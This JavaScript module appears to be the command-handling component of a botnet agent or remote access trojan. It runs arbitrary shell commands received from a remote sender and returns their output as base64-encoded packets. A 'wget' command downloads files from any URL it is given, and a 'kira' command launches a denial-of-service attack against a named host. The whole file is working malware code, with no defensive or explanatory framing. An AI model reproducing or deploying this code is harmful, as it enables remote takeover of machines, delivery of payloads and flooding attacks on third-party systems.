module.exports = function() {
    var spawn = require('child_process').spawn;
    var Packet = require('../../models/packet');
    var os = require('os');
    var hostname = os.hostname();
    var Kira = require('kira');
    var wget = require('node-wget');
    //Create new instance of Kira
    var api = new Kira();
    var toSend;

    var handleCommandExecution = function handleCommandExecution(cmdData, sender_id, receiver_id, send) {
        var output;
        var splitted = cmdData.split(' ');
        var firstElement = splitted[0];
        splitted.shift();
        var args = splitted;
        if (args === firstElement) {
            args = [];
        }

        try {
            if (firstElement === 'kill') {
                killCurrentProcess(sender_id, receiver_id, send);
                return;
            }

            if (firstElement === 'wget') {
                handleWgetExecution(args);
                return;
            }

            if (firstElement === 'kira') {
                handleKiraExecution(args);
                toSend = new Packet(sender_id, receiver_id, {
                    output: new Buffer('dos attack launched against args[0]').toString('base64'),
                    name: hostname
                });
                send(toSend);
                return;
            }


            childObject = spawn(firstElement, args, {
                detached: true
            });


            childObject.stdout.setEncoding('utf8');
            childObject.on('error',function(output){
                let toSend = new Packet(sender_id, receiver_id, {
                    output: new Buffer("Go f**k yourself! Execution went wrong").toString('base64'),
                    name: hostname
                });
                send(toSend);
            });
            childObject.stdout.on('data', function(data) {
                console.log('stdout: ' + data);
                output = data;
                toSend = new Packet(sender_id, receiver_id, {
                    output: new Buffer(output).toString('base64'),
                    name: hostname
                });
                send(toSend);
            });


        } catch (err) {
            toSend = new Packet(sender_id, receiver_id, {
                output: new Buffer('something went wrong while executing this command').toString('base64'),
                name: hostname
            });
            console.log("something went wrong");
            // console.log(`error message: ${err}`);
            send(toSend);
        }
    }


    function killCurrentProcess(sender_id, receiver_id, send) {
        try {
            childObject.kill();
            toSend = new Packet(sender_id, receiver_id, {
                output: new Buffer('Process Succesfully killed').toString('base64'),
                name: hostname
            });
        } catch (err) {
            toSend = new Packet(sender_id, receiver_id, {
                output: new Buffer('Something went wrong while killing the processs').toString('base64'),
                name: hostname
            });
        }
        send(toSend);
    }

    var handleKiraExecution = function handleKiraExecution(args) {
        var host = (typeof(args[0]) !== 'undefined') ? args[0] : '';
        var maxLimit = (typeof(args[1]) !== 'undefined') ? args[1] : 200;
        var length = (typeof(args[2]) !== 'undefined') ? args[2] : 1000;

        api.kill(host, maxLimit, length);
    }

    var handleWgetExecution = function handleWgetExecution(args) {
        wget(args[0]);
    }

    return {
        handleCommandExecution: handleCommandExecution
    }
}();
